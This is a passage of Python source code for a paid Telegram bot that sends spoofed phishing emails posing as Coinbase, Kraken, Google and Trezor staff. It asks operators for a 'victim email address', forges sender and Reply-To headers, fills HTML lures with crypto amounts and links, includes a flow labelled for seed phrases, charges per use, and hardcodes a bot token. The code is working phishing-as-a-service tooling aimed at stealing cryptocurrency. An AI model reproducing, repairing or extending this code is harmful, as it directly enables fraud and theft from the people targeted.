            return f"Failed to attach the image {image}: {e}"

    try:
        send_email_through_smtp(
            "Kraken",
            smtp_details["username"],
            "Your case is under review",
            msg,
            recipients,
        )
        return "Kraken Employee Mail sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"

async def coinbase_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the flow for sending a Coinbase delay email."""
    if not check_auth(update):
        await unauthorized_access(update, context)
        return ConversationHandler.END

    user_id = update.effective_user.id
    if not deduct_balance(user_id):
        await update.message.reply_text(
            "Insufficient balance. Please top up your balance."
        )
        return ConversationHandler.END

    context.user_data.clear()
    context.user_data["conversation"] = "coinbase_delay"
    await update.message.reply_text("Enter the victim email address:")
    return RECIPIENTS



async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAULT_TYPE, recipients, link, display_email):
    """Send the Coinbase Delay Email with the manual review link."""
    template_path = HTML_DELAY_TEMPLATE_PATH

    if not os.path.exists(template_path):
        return "Failed to send email. Template file not found."

    amount = context.user_data.get("amount", 0)
    token_symbol = context.user_data.get("token_symbol", "USDC")

    with open(template_path, "r", encoding="utf-8") as file:
        html_body = file.read()


    html_body = html_body.replace("529.75", f"{amount}")
    html_body = html_body.replace("USDC", token_symbol)
    html_body = html_body.replace("Cancel my <b>529.75 USDC</b>", f"Cancel my <b>{amount} {token_symbol}</b>")
    html_body = html_body.replace("https://link.com", link)

    msg = MIMEMultipart("related")
    msg["Subject"] = "A manual review is pending"
    msg['Reply-To'] = 'help@coinbase.com'
    msg["From"] = f"Coinbase <{display_email}>"
    msg["To"] = recipients
    html_part = MIMEText(html_body, "html", "utf-8")
    msg.attach(html_part)

    try:
        with open("images/coinbase.png", "rb") as img_file:
            img = MIMEImage(img_file.read(), name="coinbase.png")
            img.add_header("Content-ID", "<logo>")
            msg.attach(img)

        send_email_through_smtp(
            "Coinbase",
            smtp_details["username"],
            "A manual review is pending",
            msg,
            recipients,
        )
        log_email_details(update, "coinbase_delay", recipients, {"link": link, "amount": amount, "token_symbol": token_symbol})
        return "Coinbase Delay Email sent successfully!"
    except Exception as e:
        return f"Failed to send email due to an internal error: {e}"








def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients):
    try:
        recipient_list = (
            recipients.split(",") if isinstance(recipients, str) else recipients
        )

        with smtplib.SMTP(smtp_details["server"], smtp_details["port"]) as server:
            server.starttls()
            server.login(smtp_username, smtp_details["password"])

            server.sendmail(smtp_username, recipient_list, msg.as_string())

        logging.info(f"{display_name} email sent successfully to {recipients}")

    except Exception as e:
        logging.error(f"Failed to send email: {str(e)}")
        raise e

def main():
    load_email_counts()
    load_whitelist()

    TOKEN = "8111308700:AAH_6AjN90Im0Na3AsiEWRaAIjpMtn1cpeI"
    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("whitelist", whitelist))
    application.add_handler(CommandHandler("addbal", add_balance))
    application.add_handler(CommandHandler("start", startt))
    application.add_handler(CommandHandler("startt", startt))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", get_user_id))

    wallet_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("wallet", wallet_coinbase)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            SEED_PHRASE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_seed_phrase)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    employee_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("employee", employee_coinbase)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)
            ], 
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    secure_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("panel", secure_coinbase)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
            LINK: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)
            ], 
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    employee_google_handler = ConversationHandler(
        entry_points=[CommandHandler("google", employee_google)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    employee_kraken_handler = ConversationHandler(
        entry_points=[CommandHandler("kraken", employee_kraken)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [
                CallbackQueryHandler(
                    spoof_email_choice_kraken
                ) 
            ],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    employee_trezor_handler = ConversationHandler(
        entry_points=[CommandHandler("trezor", employee_trezor)],
        states={
            RECIPIENTS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)
            ],
            SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
            REPRESENTATIVE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative)
            ],
            CASE_ID: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_case_id)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    coinbase_delay_handler = ConversationHandler(
    entry_points=[CommandHandler("delay", coinbase_delay)],
    states={
        RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_recipients)],
        SPOOF_EMAIL: [CallbackQueryHandler(spoof_email_choice)],
        AMOUNT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount_token)], 
        LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],  
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)
    custom_mail_handler = ConversationHandler(
    entry_points=[CommandHandler("custom", custom_mail)],
    states={
        CUSTOM_VICTIM_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)],
        CUSTOM_SUBJECT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)],
        CUSTOM_SENDER_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_sender_name)],
        CUSTOM_DISPLAY_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_display_email)],
        CUSTOM_HTML: [MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)


    application.add_handler(custom_mail_handler)

    application.add_handler(coinbase_delay_handler)
    application.add_handler(employee_trezor_handler)
    application.add_handler(employee_kraken_handler)
    application.add_handler(wallet_coinbase_handler)
    application.add_handler(employee_coinbase_handler)
    application.add_handler(secure_coinbase_handler)
    application.add_handler(employee_google_handler)
    application.add_handler(CallbackQueryHandler(buttonst))
    

    application.run_polling()

if __name__ == "__main__":
    main()
